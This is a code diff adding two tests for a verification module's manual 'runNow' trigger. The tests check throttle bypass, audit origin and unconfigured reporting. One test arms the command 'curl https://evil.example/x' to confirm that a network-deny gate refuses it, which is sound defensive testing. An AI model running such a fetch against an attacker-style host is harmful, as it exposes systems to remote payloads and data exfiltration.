@@ -68,3 +68,30 @@ test('absent/empty config is a silent no-op', async () => {
   assert.equal(audits.length, 0);
   assert.equal(emitted.length, 0);
 });
+
+test('runNow: operator trigger bypasses burst throttle, keeps arm-check', async () => {
+  const { audits, emitted, verify, arm } = fixture();
+  arm({ onWrite: 'echo ok' });
+  await verify.afterWrite();
+  // immediate second write is burst-throttled...
+  const before = emitted.length;
+  await verify.afterWrite();
+  assert.equal(emitted.length, before);
+  // ...but a manual /verify always runs and reports
+  const r = await verify.runNow();
+  assert.equal(r.ran, true);
+  assert.equal(r.ok, true);
+  assert.equal(emitted.length, before + 1);
+  assert.equal(audits.at(-1).data.origin, 'manual');
+});
+
+test('runNow: unconfigured reports cleanly; gated command still refused', async () => {
+  const { verify, arm } = fixture();
+  const r0 = await verify.runNow();
+  assert.equal(r0.ran, false);
+  assert.match(r0.reason, /no \.pai\/verify\.json/);
+  const v2 = fixture({ network: 'deny' });
+  v2.arm({ onWrite: 'curl https://evil.example/x' });
+  const r1 = await v2.verify.runNow();
+  assert.equal(r1.refused, true);
+});
